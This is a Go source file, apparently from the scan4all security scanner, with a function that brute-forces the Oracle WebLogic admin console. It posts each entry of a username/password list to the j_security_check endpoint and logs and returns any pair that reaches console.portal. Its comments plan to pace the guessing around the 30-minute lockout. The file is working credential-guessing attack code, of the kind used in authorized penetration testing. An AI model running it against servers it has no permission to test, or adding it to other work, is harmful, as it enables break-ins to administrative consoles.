package brute

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
)

// Weblogic's default number of login attempts is 5 times;
//
//	After 5 failed attempts the weblogic user is locked, and even if you have found the correct password you cannot log in to the console
//	The default lockout time is 30 minutes. Later a policy can be set to run automatically in the background, doing one round of non-repeating passwords every 30 minutes
//	Later optimize the interval to continue with the remaining passwords after 35 minutes
func Weblogic_brute(url string) (username string, password string) {
	if req, err := util.HttpRequset(url+"/console/login/LoginForm.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			var pay string
			for uspa := range weblogicuserpass {
				pay = fmt.Sprintf("j_username=%s&j_password=%s", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password)
				if req2, err2 := util.HttpRequset(url+"/console/j_security_check", "POST", pay, true, nil); err2 == nil {
					if util.StrContains(req2.RequestUrl, "console.portal") {
						util.SendLog(req2.RequestUrl, "weblogic_brute", fmt.Sprintf("Found vuln Weblogic password|%s:%s|%s\n", weblogicuserpass[uspa].username, weblogicuserpass[uspa].password, url+"/console/"), pay)
						return weblogicuserpass[uspa].username, weblogicuserpass[uspa].password
					}
				}
			}
			return "login_page", ""
		}
	}
	return "", ""
}
